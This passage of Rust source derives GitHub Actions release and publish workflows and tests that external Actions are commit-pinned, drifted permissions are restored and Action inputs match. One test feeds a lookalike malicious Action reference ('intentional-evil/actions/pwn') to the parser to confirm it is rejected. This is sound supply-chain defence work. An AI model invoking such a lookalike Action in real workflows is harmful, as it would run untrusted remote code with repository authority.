                (
                    "@RELEASE_UNIT@",
                    &scalar(&consumer.publication.release_unit),
                ),
                ("@PACKAGE@", &scalar(&consumer.publication.package)),
                (
                    "@PUBLISHER@",
                    &scalar(consumer.publication.publisher.as_str()),
                ),
                ("@TARGET@", &scalar(&consumer.publication.target)),
                ("@PUBLICATION@", &scalar(&identity)),
                ("@SUBJECT_SLUG@", &consumer.subject.slug),
                ("@DELIVERABLE_FIND@", find),
                ("@CONSUMED_FIND@", &consumer.consumed),
                ("@VERIFY@", verify),
            ],
        )?);
    }
    job(
        PUBLISH_UPLOAD_JOB,
        namespaces,
        &[
            ("@NEEDS@", &render_list(needs)),
            ("@VERIFY@", verify),
            ("@DELIVERABLE_STEPS@", &deliverable_steps),
            ("@HANDOFF_STEPS@", &handoff_steps),
        ],
    )
}

/// Managed job sealing and publishing the tags one executor phase declares.
fn phase_tag_job(
    namespaces: &PrefixNamespaces,
    phase: TagPhase,
    needs: &[String],
) -> std::result::Result<Value, WorkflowDiagnostic> {
    // Each phase seals a different staged input: the before-publication phase
    // seals the built subjects, the after-publication phase seals the accepted
    // publisher fragments. Both are transported as artifacts of the jobs that
    // produced them and both leave the sealed evidence behind as a document.
    //
    // The sealed documents carry their own artifact prefix rather than the
    // fragment one. Sharing it made the after-publication tag's staged pattern
    // match the before-publication document and its own output, which the
    // loader skipped by schema identity but which nothing in the graph said was
    // intended; assembly reads both prefixes explicitly instead.
    let staged = match phase {
        // The before-publication phase reads documents, not bytes, so it
        // downloads the document-only artifact rather than every subject's
        // build output. Bytes and document still travel together to the
        // publishers, which is where the binding has to hold.
        TagPhase::BeforePublication => "subjectdoc",
        TagPhase::AfterPublication => "evidence",
    };
    job(
        PUBLISH_PHASE_TAG_JOB,
        namespaces,
        &[
            ("@NEEDS@", &render_list(needs)),
            ("@PHASE@", &phase.to_string()),
            ("@STAGED@", staged),
            (
                "@SEAL_NAME@",
                &scalar(&format!("Seal the {phase} release tags")),
            ),
            (
                "@PUSH_NAME@",
                &scalar(&format!("Publish the {phase} release tags")),
            ),
            (
                "@UPLOAD_NAME@",
                &scalar(&format!("Upload the sealed {phase} evidence")),
            ),
        ],
    )
}

#[cfg(test)]
mod tests {
    use super::templates::{
        ACTION_REPOSITORY, APP_TOKEN_ACTION, ATTEST_BUILD_PROVENANCE_ACTION, CHECKOUT_ACTION,
        CROSS_INSTALL_ACTION, DOWNLOAD_ARTIFACT_ACTION, GORELEASER_INSTALL_ACTION,
        SETUP_BUILDX_ACTION, SETUP_QEMU_ACTION, UPLOAD_ARTIFACT_ACTION,
    };
    use super::*;
    use crate::evidence::assemble::CleanClientMode;
    use crate::executor::fixture::Workspace;
    use crate::executor::recipe::Capability;
    use crate::publication::observation::ObservationState;
    use sha2::{Digest, Sha256};
    use std::collections::{BTreeMap, BTreeSet};

    include!("workflow/tests/goreleaser.rs");
    include!("workflow/tests/homebrew.rs");
    include!("workflow/tests/homebrew_platform_contracts.rs");
    include!("workflow/tests/system_packages.rs");
    include!("workflow/tests/aur.rs");
    include!("workflow/tests/registry.rs");
    include!("workflow/tests/goreleaser_recipes.rs");
    include!("workflow/tests/oci_recipes.rs");

    fn test_tool_path(base: &str) -> String {
        let mut directories = Vec::new();
        if let Some(directory) = std::env::var_os("PYTHON_HOME") {
            directories.push(std::path::PathBuf::from(directory).join("bin"));
        }
        if let Some(directory) = std::env::var_os("JQ")
            .and_then(|jq| std::path::PathBuf::from(jq).parent().map(Path::to_path_buf))
        {
            directories.push(directory);
        }
        let prefix = std::env::join_paths(directories)
            .expect("test tool paths are valid")
            .to_string_lossy()
            .into_owned();
        if prefix.is_empty() {
            base.to_owned()
        } else {
            format!("{prefix}:{base}")
        }
    }

    /// Fixed stock-runner tools a portable observer fixture may execute.
    ///
    /// Materializing wrappers into one isolated directory keeps the test's
    /// meaning independent of every other executable on the host `PATH`.
    const OBSERVER_BASELINE_TOOLS: &[&str] = &[
        "awk",
        "bash",
        "cat",
        "cmp",
        "cp",
        "cut",
        "dirname",
        "find",
        "grep",
        "gzip",
        "head",
        "jq",
        "ls",
        "mkdir",
        "mktemp",
        "mv",
        "python3",
        "readlink",
        "rm",
        "sed",
        "sha256sum",
        "sort",
        "tail",
        "tar",
        "tr",
        "wc",
        "xz",
    ];

    /// Build a `PATH` containing exactly the named baseline tools.
    fn isolated_observer_baseline(directory: &Path) -> PathBuf {
        let _ = std::fs::remove_dir_all(directory);
        std::fs::create_dir_all(directory).expect("observer baseline directory");
        let search = test_tool_path(&std::env::var("PATH").unwrap_or_default());
        let search = std::env::split_paths(&search).collect::<Vec<_>>();
        for tool in OBSERVER_BASELINE_TOOLS {
            let executable = search
                .iter()
                .map(|candidate| candidate.join(tool))
                .find(|candidate| candidate.is_file())
                .unwrap_or_else(|| panic!("observer baseline tool {tool} is available"));
            let quoted = executable.display().to_string().replace('\'', "'\\''");
            let wrapper = directory.join(tool);
            std::fs::write(&wrapper, format!("#!/bin/sh\nexec '{quoted}' \"$@\"\n"))
                .unwrap_or_else(|error| panic!("{tool} baseline wrapper: {error}"));
            let status = std::process::Command::new("chmod")
                .args(["+x", wrapper.to_str().expect("baseline wrapper path")])
                .status()
                .expect("chmod baseline wrapper");
            assert!(status.success(), "{tool} baseline wrapper is executable");
        }
        directory.to_owned()
    }

    const CONFIG: &str = r#"$schema: https://intentional.foo/schemas/config.yml
contract: contract-2
workspace-tags:
  release:
    template: '{version}'
github:
  workflows:
    release: { path: .github/workflows/release.yml, gates: [ candidate_check ] }
    publish: { path: .github/workflows/publish.yml, gates: [ artifact_check ] }
release-units:
  component:
    path: component
    packages:
      package:
        path: .
        cargo: { registry: {} }
    tags:
      primary: { role: primary, template: '{id}@{version}', require-phase: after-publication }
      staged: { role: projection, template: '{id}/staged@{version}', require-phase: before-publication }
"#;

    #[test]
    fn binds_external_action_constants_to_the_authored_declarations() {
        let declaration: Value =
            serde_yaml::from_str(include_str!("../../../../github-action-pins.yml"))
                .expect("the Action pin declaration parses");
        let declared = declaration["actions"].as_sequence().expect("actions table");
        let declared_names = declared
            .iter()
            .map(|entry| entry["constant"].as_str().expect("constant name"))
            .filter(|name| !name.starts_with("WORKFLOW_"))
            .collect::<BTreeSet<_>>();

        let source = include_str!("workflow/templates.rs");
        let source_names = source
            .lines()
            .filter_map(|line| {
                let declaration = line.split("const ").nth(1)?;
                let name = declaration.split(':').next()?;
                name.ends_with("_ACTION").then_some(name)
            })
            .collect::<BTreeSet<_>>();
        assert_eq!(
            declared_names, source_names,
            "the table and constants enumerate each other"
        );

        let constants = [
            ("CHECKOUT_ACTION", CHECKOUT_ACTION),
            ("APP_TOKEN_ACTION", APP_TOKEN_ACTION),
            ("DOWNLOAD_ARTIFACT_ACTION", DOWNLOAD_ARTIFACT_ACTION),
            ("UPLOAD_ARTIFACT_ACTION", UPLOAD_ARTIFACT_ACTION),
            (
                "ATTEST_BUILD_PROVENANCE_ACTION",
                ATTEST_BUILD_PROVENANCE_ACTION,
            ),
            ("SETUP_BUILDX_ACTION", SETUP_BUILDX_ACTION),
            ("SETUP_QEMU_ACTION", SETUP_QEMU_ACTION),
            ("GORELEASER_INSTALL_ACTION", GORELEASER_INSTALL_ACTION),
            ("CROSS_INSTALL_ACTION", CROSS_INSTALL_ACTION),
            ("SETUP_CRANE_ACTION", SETUP_CRANE_ACTION),
            ("COSIGN_INSTALLER_ACTION", COSIGN_INSTALLER_ACTION),
        ]
        .into_iter()
        .collect::<BTreeMap<_, _>>();
        assert_eq!(
            constants.keys().copied().collect::<BTreeSet<_>>(),
            source_names
        );
        for name in source_names {
            let visibility = if matches!(
                name,
                "SETUP_CRANE_ACTION"
                    | "COSIGN_INSTALLER_ACTION"
                    | "SETUP_BUILDX_ACTION"
                    | "GORELEASER_INSTALL_ACTION"
            ) {
                "pub(in crate::executor)"
            } else {
                "pub(super)"
            };
            assert!(
                source.contains(&format!("{visibility} const {name}:")),
                "{name} retains its declared visibility {visibility}"
            );
        }
        for entry in declared {
            let name = entry["constant"].as_str().expect("constant name");
            if name.starts_with("WORKFLOW_") {
                continue;
            }
            let expected = format!(
                "{}@{}",
                entry["repository"].as_str().expect("repository"),
                entry["commit"].as_str().expect("commit")
            );
            assert_eq!(
                constants[name], expected,
                "{name} agrees with the authored pin"
            );
        }
    }

    #[test]
    fn derives_only_declared_complete_external_action_commits() {
        let declaration: Value =
            serde_yaml::from_str(include_str!("../../../../github-action-pins.yml"))
                .expect("Action pins parse");
        let declared = declaration["actions"]
            .as_sequence()
            .expect("actions table")
            .iter()
            .filter(|entry| {
                !entry["constant"]
                    .as_str()
                    .expect("constant name")
                    .starts_with("WORKFLOW_")
            })
            .map(|entry| {
                format!(
                    "{}@{}",
                    entry["repository"].as_str().expect("repository"),
                    entry["commit"].as_str().expect("commit")
                )
            })
            .collect::<BTreeSet<_>>();
        let mut reached = BTreeSet::new();
        let rust = rust_homebrew_workspace(
            "workflow-action-pins-rust",
            "[package]\nname = \"sample-tool\"\nversion = \"1.2.3\"\n",
        );
        rust.write("component/src/main.rs", "fn main() {}\n");

        for (fixture, workspace) in [
            ("base", workspace("workflow-action-pins-base")),
            ("goreleaser", go_workspace("workflow-action-pins-go")),
            ("rust", rust),
            (
                "buildx",
                two_destination_workspace("workflow-action-pins-buildx"),
            ),
        ] {
            for role in WorkflowRole::ALL {
                converge(workspace.root(), role);
                let document: Value = serde_yaml::from_str(&workflow(workspace.root(), role))
                    .expect("derived workflow parses");
                for (job_id, job) in document["jobs"].as_mapping().expect("jobs") {
                    let Some(job_id) = job_id.as_str().filter(|id| id.starts_with("intentional_"))
                    else {
                        continue;
                    };
                    for step in job["steps"].as_sequence().expect("managed job steps") {
                        let Some(action) = step.get("uses").and_then(Value::as_str) else {
                            continue;
                        };
                        if is_intentional_action(action) {
                            continue;
                        }
                        let (_, commit) = action.rsplit_once('@').expect("Action has a revision");
                        assert!(
                            commit.len() == 40
                                && commit.bytes().all(|byte| byte.is_ascii_hexdigit()),
                            "{fixture} {role} {job_id} uses a complete commit identity: {action}"
                        );
                        assert!(
                            declared.contains(action),
                            "{fixture} {role} {job_id} uses the declared identity: {action}"
                        );
                        reached.insert(action.to_owned());
                    }
                }
            }
        }
        assert_eq!(
            reached, declared,
            "the fixture set reaches every declared external Action"
        );
    }

    #[test]
    fn distinguishes_first_party_actions_from_lookalike_repositories() {
        assert!(
            !is_intentional_action("wyrd-company/intentional-evil/actions/pwn@main"),
            "a lookalike repository is external"
        );
        assert!(
            !is_intentional_action("wyrd-company/intentional/foo@main"),
            "a path outside Actions is external"
        );
        assert!(
            is_intentional_action("wyrd-company/intentional/actions/prepare@0.1.6"),
            "an Action under the repository Actions path is first-party"
        );
    }

    #[test]
    fn resolves_first_party_actions_and_rejects_lookalikes() {
        let step =
            |uses: &str| serde_yaml::from_str(&format!("uses: {uses}")).expect("a step parses");
        assert_eq!(
            intentional_action(&step("wyrd-company/intentional/actions/prepare@0.1.6")),
            Some(("prepare".to_owned(), "0.1.6".to_owned())),
            "the parser resolves a first-party Action"
        );
        assert!(
            intentional_action(&step("wyrd-company/intentional-evil/actions/pwn@main")).is_none(),
            "the parser rejects a lookalike repository"
        );
        assert!(
            intentional_action(&step("wyrd-company/intentional/foo@main")).is_none(),
            "the parser rejects a path outside Actions"
        );
    }

    const REPOSITORY_RELEASE_WORKFLOW: &str = r#"# maintained by the repository
name: release

on:
  workflow_dispatch:

jobs:
  # gates the authority transition
  candidate_check:
    runs-on: ubuntu-latest
    steps:
      - run: 'true'
"#;

    const REPOSITORY_PUBLISH_WORKFLOW: &str = r#"name: publish

on:
  push:
    tags:
      - 'legacy-*'

jobs:
  artifact_check:
    runs-on: ubuntu-latest
    steps:
      - run: 'true'
"#;

    fn workspace_without_package(label: &str) -> Workspace {
        let workspace = Workspace::new(label);
        workspace
            .write(".intentional/config.yml", CONFIG)
            .write(".github/workflows/release.yml", REPOSITORY_RELEASE_WORKFLOW)
            .write(".github/workflows/publish.yml", REPOSITORY_PUBLISH_WORKFLOW);
        workspace
    }

    fn workspace(label: &str) -> Workspace {
        let workspace = workspace_without_package(label);
        workspace.write(
            "component/Cargo.toml",
            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\n",
        );
        workspace
    }

    fn repository_scale_workspace(label: &str) -> Workspace {
        let workspace = Workspace::new(label);
        workspace
            .write(
                ".intentional/config.yml",
                include_str!("../../../../.intentional/config.yml"),
            )
            .write(
                "crates/cli/Cargo.toml",
                "[package]\nname = \"sample-tool\"\nversion = \"1.0.0\"\nauthors = [\"Sample Maintainer <maintainer@example.invalid>\"]\n",
            )
            .write("crates/cli/src/main.rs", "fn main() {}\n")
            .write(
                "crates/core/Cargo.toml",
                "[package]\nname = \"sample-library\"\nversion = \"1.0.0\"\n",
            )
            .write("crates/core/src/lib.rs", "pub fn sample() {}\n")
            .write(
                "npm/package.json",
                r#"{"name":"sample-launcher","version":"1.0.0"}"#,
            )
            .write(
                ".github/workflows/release.yml",
                "name: release\non: {}\njobs: {}\n",
            )
            .write(
                ".github/workflows/publish.yml",
                "name: publish\non: push\njobs: {}\n",
            );
        workspace
    }

    fn converge(root: &Path, role: WorkflowRole) -> WorkflowComparison {
        let comparison = compare_workflow(root, role, None).expect("comparison runs");
        assert_eq!(
            comparison.status,
            ComparisonStatus::Different,
            "{:?}",
            comparison.diagnostics
        );
        comparison.apply().expect("transformation applies")
    }

    /// Materialize a deliberately broad contract used only by structural
    /// sweeps. Its all-recipe fixture exceeds the supported workflow size by
    /// construction, so it cannot exercise the public comparison/apply path.
    fn materialize_contract_for_structural_sweep(root: &Path, role: WorkflowRole) {
        super::materialize_contract_for_structural_test(root, role)
            .expect("structural contract derives");
    }

    fn workflow(root: &Path, role: WorkflowRole) -> String {
        std::fs::read_to_string(root.join(format!(".github/workflows/{role}.yml")))
            .expect("workflow readable")
    }

    #[test]
    fn adds_the_complete_release_contract_and_preserves_repository_content() {
        let workspace = workspace("workflow-release");
        converge(workspace.root(), WorkflowRole::Release);
        let updated = workflow(workspace.root(), WorkflowRole::Release);

        assert!(
            updated.starts_with("# maintained by the repository\nname: release\n"),
            "repository header and comments survive: {updated}"
        );
        assert!(
            updated.contains("  # gates the authority transition\n  candidate_check:"),
            "the repository-owned gate job and its comment survive: {updated}"
        );
        assert!(
            updated.contains("concurrency:") && updated.contains("cancel-in-progress: false"),
            "the release concurrency policy is added: {updated}"
        );
        assert!(
            updated.contains("permissions:\n  contents: read\n"),
            "the safe top-level permission default is added: {updated}"
        );
        assert!(
            updated.contains("  intentional_prepare:")
                && updated.contains("  intentional_release:"),
            "both reserved release jobs are inserted: {updated}"
        );
        assert!(
            updated.contains("      - candidate_check"),
            "the configured gate becomes a dependency of the authority transition: {updated}"
        );
        let document: Value = serde_yaml::from_str(&updated).expect("result parses");
        assert_eq!(
            document["jobs"]["intentional_release"]["environment"].as_str(),
            Some("intentional-release")
        );
    }

    #[test]
    fn reports_a_read_only_patch_without_changing_the_workflow() {
        let workspace = workspace("workflow-read-only");
        let before = workflow(workspace.root(), WorkflowRole::Release);
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Release, None).expect("comparison");
        assert!(comparison.changed());
        assert!(!comparison.applied);
        assert!(
            comparison.patch.contains("+  intentional_prepare:"),
            "{}",
            comparison.patch
        );
        assert_eq!(
            workflow(workspace.root(), WorkflowRole::Release),
            before,
            "a comparison without apply never writes"
        );
    }

    #[test]
    fn converges_and_then_reports_conformance() {
        let workspace = workspace("workflow-idempotent");
        for role in WorkflowRole::ALL {
            let applied = converge(workspace.root(), role);
            assert!(applied.applied);
            let repeated = compare_workflow(workspace.root(), role, None).expect("recompare");
            assert_eq!(
                repeated.status,
                ComparisonStatus::Conformant,
                "reconciliation is idempotent for {role}: {}",
                repeated.patch
            );
            assert_eq!(
                repeated.input_digest,
                applied.output_digest.expect("digest")
            );
        }
    }

    #[test]
    fn replaces_a_drifted_reserved_job_and_leaves_repository_jobs_alone() {
        let workspace = workspace("workflow-drift");
        converge(workspace.root(), WorkflowRole::Release);
        let converged = workflow(workspace.root(), WorkflowRole::Release);
        let weakened = converged.replace(
            "  intentional_prepare:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n",
            "  intentional_prepare:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n",
        );
        assert_ne!(
            weakened, converged,
            "the fixture weakens a managed permission"
        );
        std::fs::write(
            workspace.root().join(".github/workflows/release.yml"),
            &weakened,
        )
        .expect("write drifted workflow");

        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Release, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Different);
        let restored = comparison.apply().expect("apply");
        assert!(restored.applied);
        assert_eq!(workflow(workspace.root(), WorkflowRole::Release), converged);
    }

    #[test]
    fn refuses_a_transformation_computed_from_stale_bytes() {
        let workspace = workspace("workflow-stale");
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Release, None).expect("comparison");
        let path = workspace.root().join(".github/workflows/release.yml");
        std::fs::write(
            &path,
            format!("# edited elsewhere\n{REPOSITORY_RELEASE_WORKFLOW}"),
        )
        .expect("concurrent edit");

        let error = comparison
            .apply()
            .expect_err("stale transformation refused");
        assert!(
            error
                .to_string()
                .contains("Workflow input digest does not match"),
            "{error}"
        );
        assert!(
            std::fs::read_to_string(&path)
                .expect("workflow readable")
                .starts_with("# edited elsewhere"),
            "the newer workflow is left intact"
        );
    }

    #[test]
    fn migrates_sentinel_bearing_slices_and_preserves_unsentinelized_old_prefix_jobs() {
        let workspace = workspace("workflow-prefix");
        converge(workspace.root(), WorkflowRole::Release);
        let converged = workflow(workspace.root(), WorkflowRole::Release);
        std::fs::write(
            workspace.root().join(".github/workflows/release.yml"),
            converged.replace(
                "jobs:\n",
                "jobs:\n  intentional_legacy:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
            ),
        )
        .expect("add an unsentinelized old-prefix job");
        workspace.write(
            ".intentional/config.yml",
            &CONFIG.replace("github:\n", "github:\n  prefix: replacement\n"),
        );

        converge(workspace.root(), WorkflowRole::Release);
        let migrated = workflow(workspace.root(), WorkflowRole::Release);
        assert!(
            migrated.contains("  replacement_prepare:")
                && migrated.contains("  replacement_release:"),
            "newly prefixed slices are inserted: {migrated}"
        );
        assert!(
            !migrated.contains("  intentional_prepare:")
                && !migrated.contains("  intentional_release:"),
            "sentinel-bearing slices under the old prefix are removed: {migrated}"
        );
        assert!(
            migrated.contains("  intentional_legacy:"),
            "an old-prefix job without the sentinel stays repository-owned: {migrated}"
        );
    }

    #[test]
    fn derives_publisher_closure_and_gate_dependencies_for_publication() {
        let workspace = workspace("workflow-publish");
        converge(workspace.root(), WorkflowRole::Publish);
        let updated = workflow(workspace.root(), WorkflowRole::Publish);

        assert!(
            updated.contains("      - 'legacy-*'") || updated.contains("      - legacy-*"),
            "the repository's own tag trigger survives: {updated}"
        );
        assert!(
            updated.contains("intentional_publish_component_package_cargo_primary:"),
            "the resolved publication derives a managed job: {updated}"
        );
        assert!(
            updated.contains("intentional_assemble_evidence:")
                && updated.contains("intentional_close_release:"),
            "evidence assembly and closure jobs are derived: {updated}"
        );
        let document: Value = serde_yaml::from_str(&updated).expect("result parses");
        let closure = &document["jobs"]["intentional_close_release"]["needs"];
        assert!(
            closure
                .as_sequence()
                .expect("closure needs")
                .contains(&Value::String("artifact_check".to_owned())),
            "the configured publish gate governs closure: {closure:?}"
        );
        let tags = document["on"]["push"]["tags"].as_sequence().expect("tags");
        let config = Config::load(workspace.root()).expect("config loads");
        assert_eq!(
            tags.len(),
            2 + phased_tag_templates(&config).len(),
            "the global release tag and phase exclusions join the repository's own: {tags:?}"
        );
    }

    /// Steps of every managed job in one derived workflow, by job identifier.
    fn managed_steps(root: &Path, role: WorkflowRole) -> Vec<(String, Vec<Value>)> {
        let document: Value = serde_yaml::from_str(&workflow(root, role)).expect("result parses");
        document["jobs"]
            .as_mapping()
            .expect("jobs")
            .iter()
            .filter_map(|(id, body)| {
                let id = id.as_str()?;
                id.starts_with("intentional_").then(|| {
                    let steps = body["steps"].as_sequence().expect("steps");
                    let expanded = steps
                        .iter()
                        .flat_map(|step| {
                            [Some(step.clone()), portable_observer_step(step)]
                                .into_iter()
                                .flatten()
                        })
                        .collect();
                    (id.to_owned(), expanded)
                })
            })
            .collect()
    }

    /// Executable observer behind one derived verify-publication Action call.
    ///
    /// Workflow tests execute managed shell against stub clients. Readback now
    /// lives behind a composite Action, so the harness expands that Action from
    /// its parsed declaration rather than teaching every adapter test a second
    /// runner. Inputs resolve from the caller's `with:` mapping and the Action's
    /// defaults, which keeps producer/consumer spelling in the execution path.
    fn portable_observer_step(step: &Value) -> Option<Value> {
        let (name, _) = intentional_action(step)?;
        if name != "verify-publication" {
            return None;
        }
        if step["with"]["observe"].as_str() == Some("false")
            || step["with"]["observe"].as_bool() == Some(false)
        {
            return None;
        }
        let path = action_document(&name);
        let document: Value = serde_yaml::from_str(
            &std::fs::read_to_string(&path).expect("verification Action readable"),
        )
        .expect("verification Action parses");
        let observer = document["runs"]["steps"]
            .as_sequence()
            .expect("Action steps")
            .iter()
            .find(|candidate| candidate["id"].as_str() == Some("observe"))
            .expect("verification Action observes before it verifies");
        let supplied = step
            .get("with")
            .and_then(Value::as_mapping)
            .cloned()
            .unwrap_or_default();
        let declared = document["inputs"].as_mapping().expect("Action inputs");
        let mut environment = serde_yaml::Mapping::new();
        for (key, value) in observer["env"].as_mapping().expect("observer environment") {
            let expression = value.as_str().expect("input expression");
            let input = expression
                .trim()
                .strip_prefix("${{")
                .and_then(|rest| rest.strip_suffix("}}"))
                .map(str::trim)
                .and_then(|reference| reference.strip_prefix("inputs."))
                .expect("observer environment reads an input");
            let input_key = Value::String(input.to_owned());
            let resolved = supplied
                .get(&input_key)
                .cloned()
                .or_else(|| declared.get(&input_key)?.get("default").cloned())
                .unwrap_or_else(|| Value::String(String::new()));
            environment.insert(key.clone(), resolved);
        }
        environment.insert(
            Value::String("GITHUB_ACTION_PATH".to_owned()),
            Value::String(
                path.parent()
                    .expect("Action directory")
                    .display()
                    .to_string(),
            ),
        );
        let mut expanded = serde_yaml::Mapping::new();
        expanded.insert(
            Value::String("name".to_owned()),
            Value::String("Read back and retrieve the publication".to_owned()),
        );
        expanded.insert(Value::String("env".to_owned()), Value::Mapping(environment));
        expanded.insert(Value::String("run".to_owned()), observer["run"].clone());
        Some(Value::Mapping(expanded))
    }

    /// Non-baseline observer client one emitted installer actually provides.
    ///
    /// This reads the Action reference or command rather than the step id, so
    /// an id claiming one client while its body installs another is a mismatch
    /// instead of a self-confirming declaration.
    fn observer_client_installed_by(step: &Value) -> Option<String> {
        let client = match step["uses"].as_str() {
            Some(SETUP_CRANE_ACTION) => "crane",
            Some(COSIGN_INSTALLER_ACTION) => "cosign",
            Some(SETUP_BUILDX_ACTION) => "docker-buildx",
            Some(GORELEASER_INSTALL_ACTION) => "goreleaser",
            _ => {
                let run = step["run"].as_str()?;
                if run.contains(
                    "npm install --global --no-fund --no-audit --ignore-scripts @devcontainers/cli@",
                ) {
                    "devcontainer"
                } else {
                    run.lines()
                        .find_map(|line| {
                            line.trim()
                                .strip_prefix("sudo apt-get install --yes ")
                        })?
                }
            }
        };
        let id = step["id"]
            .as_str()
            .and_then(|id| id.strip_prefix("intentional_install_"))?
            .replace('_', "-");
        assert_eq!(
            id, client,
            "installer id names the client its body provides"
        );
        Some(client.to_owned())
    }

    /// Remainder beneath `wyrd-company/intentional/actions/` when the reference is first-party.
    fn intentional_actions_path(action: &str) -> Option<&str> {
        action
            .strip_prefix(ACTION_REPOSITORY)
            .and_then(|path| path.strip_prefix("/actions/"))
    }

    /// Whether one Action reference lies beneath this repository's Actions path.
    fn is_intentional_action(action: &str) -> bool {
        intentional_actions_path(action).is_some()
    }

    /// The Action one managed step resolves from this repository, if any.
    fn intentional_action(step: &Value) -> Option<(String, String)> {
        let action = step.get("uses")?.as_str()?;
        intentional_actions_path(action)?
            .split_once('@')
            .map(|(name, reference)| (name.to_owned(), reference.to_owned()))
    }

    /// The document one published Action is defined by.
    fn action_document(name: &str) -> PathBuf {
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../actions")
            .join(name)
            .join("action.yml")
    }

    /// The inputs of an Action and the keys a step supplies it, in both
    /// directions.
    ///
    /// An Action input is an agreement between two documents nothing joins: the
    /// Action declares it, and a managed step spells it in `with:`. Both halves
    /// of the agreement fail silently, and they fail the same way. A step that
    /// omits a required input is not a parse error and not a rendering failure —
    /// the derived workflow is still valid YAML and every structural assertion
    /// in this module still passes over it. A step that supplies a key the
    /// Action never declares is worse: GitHub ignores it without warning, so the
    /// input the author meant to set arrives as its default and the workflow
    /// runs to completion doing the wrong thing. A single transposed character
    /// in a `with:` key produces exactly that. Either way it fails on a runner,
    /// once, at the end of a release.
    ///
    /// The sweep reads the Action documents rather than a list written here, so
    /// an input added to or removed from any of them is covered the day it
    /// changes.
    #[test]
    fn supplies_every_required_input_of_every_action_it_resolves() {
        let workspace = workspace("workflow-action-inputs");
        let mut swept = BTreeSet::new();
        for role in WorkflowRole::ALL {
            converge(workspace.root(), role);
            for (id, steps) in managed_steps(workspace.root(), role) {
                for step in &steps {
                    let Some((name, _)) = intentional_action(step) else {
                        continue;
                    };
                    swept.insert(name.clone());
                    let supplied = step
                        .get("with")
                        .and_then(Value::as_mapping)
                        .map(|with| {
                            with.keys()
                                .filter_map(Value::as_str)
                                .map(str::to_owned)
                                .collect::<BTreeSet<_>>()
                        })
                        .unwrap_or_default();
                    let declared = declared_action_inputs(&name);
                    for input in required_action_inputs(&name) {
                        assert!(
                            supplied.contains(&input),
                            "{id} resolves {name}, which requires input {input}; it supplies {supplied:?}"
                        );
                    }
                    for key in &supplied {
                        assert!(
                            declared.contains(key),
                            "{id} resolves {name} and supplies {key}, which {name} does not declare; it declares {declared:?}"
                        );
                    }
                }
            }
        }
        assert!(
            !swept.is_empty(),
            "the derived workflows resolve this repository's Actions"
        );
    }

    /// The inputs one published Action declares required.
    fn required_action_inputs(name: &str) -> BTreeSet<String> {
        action_inputs(name)
            .iter()
            .filter(|(_, body)| {
                body.get("required")
                    .and_then(Value::as_bool)
                    .unwrap_or(false)
            })
            .filter_map(|(key, _)| key.as_str().map(str::to_owned))
            .collect()
    }

    /// Every input one published Action declares, required or not.
    fn declared_action_inputs(name: &str) -> BTreeSet<String> {
        action_inputs(name)
            .keys()
            .filter_map(Value::as_str)
            .map(str::to_owned)
            .collect()
    }

    /// The `inputs` mapping one published Action declares.
    fn action_inputs(name: &str) -> serde_yaml::Mapping {
        let path = action_document(name);
        let document: Value = serde_yaml::from_str(
            &std::fs::read_to_string(&path).expect("action document readable"),
        )
        .expect("action document parses");
        document
            .get("inputs")
            .and_then(Value::as_mapping)
            .cloned()
            .unwrap_or_default()
    }

    /// The declared outputs of one published Action.
    fn action_outputs(name: &str) -> BTreeSet<String> {
        let path = action_document(name);
        let document: Value = serde_yaml::from_str(
            &std::fs::read_to_string(&path).expect("action document readable"),
        )
        .expect("action document parses");
        document
            .get("outputs")
            .and_then(Value::as_mapping)
            .map(|outputs| {
                outputs
                    .keys()
                    .filter_map(Value::as_str)
                    .map(str::to_owned)
                    .collect()
            })
            .unwrap_or_default()
    }

    // A stock runner carries no `intentional` on PATH, and nothing in this
    // crate writes `$GITHUB_OUTPUT`. A managed job that spelled a portable
    // command in a `run:` body would therefore both fail to find the binary and
    // produce no step outputs for the next step to read. Reaching every
    // portable command through a published Action is what supplies both, so the
    // absence of a bare invocation is the property worth asserting rather than
    // the presence of any particular step text.
    #[test]
    fn reaches_every_portable_command_through_a_published_action() {
        let workspace = workspace("workflow-command-boundary");
        let expected = [
            (
                WorkflowRole::Release,
                ["prepare-release", "verify-handoff"].as_slice(),
            ),
            (
                WorkflowRole::Publish,
                [
                    "assemble-evidence",
                    "record-built-subject",
                    "seal-phase-tags",
                    "verify-publication",
                    "verify-release-tag",
                ]
                .as_slice(),
            ),
        ];
        for (role, actions) in expected {
            converge(workspace.root(), role);
            let mut resolved = BTreeSet::new();
            for (id, steps) in managed_steps(workspace.root(), role) {
                for step in &steps {
                    if let Some((name, _)) = intentional_action(step) {
                        resolved.insert(name);
                    }
                    for line in step
                        .get("run")
                        .and_then(Value::as_str)
                        .unwrap_or_default()
                        .lines()
                    {
                        let command = line.split_whitespace().next().unwrap_or_default();
                        assert_ne!(
                            command.rsplit('/').next(),
                            Some("intentional"),
                            "{id} runs a portable command without obtaining the binary: {line}"
                        );
                    }
                }
            }
            assert_eq!(
                resolved,
                actions
                    .iter()
                    .map(|name| (*name).to_owned())
                    .collect::<BTreeSet<_>>(),
                "the {role} workflow reaches exactly the portable commands its protocol runs"
            );
        }
    }

    // One derivation names one Action revision and one binary revision. A job
    // that resolved the Action at one version while installing another would
    // run an argument contract neither document states.
    #[test]
    fn pins_every_intentional_action_and_its_binary_to_the_deriving_version() {
        let workspace = workspace("workflow-action-pinning");
        for role in WorkflowRole::ALL {
            converge(workspace.root(), role);
            let mut pinned = 0;
            for (id, steps) in managed_steps(workspace.root(), role) {
                for step in &steps {
                    let Some((name, reference)) = intentional_action(step) else {
                        continue;
                    };
                    pinned += 1;
                    assert_eq!(reference, crate::VERSION, "{id} resolves {name}");
                    assert!(
                        action_document(&name).is_file(),
                        "{id} resolves an Action this repository publishes; {name} is not one"
                    );
                    assert_eq!(
                        step["with"]["intentional-version"].as_str(),
                        Some(crate::VERSION),
                        "{id} installs the binary {name} states its contract for"
                    );
                }
            }
            assert!(pinned > 0, "the {role} workflow resolves managed Actions");
        }
    }

    // A managed job that reaches a portable command through an Action installs
    // a released binary over the network, and the authority transition is also
    // the job that mints repository-write authority. Ordering is what keeps the
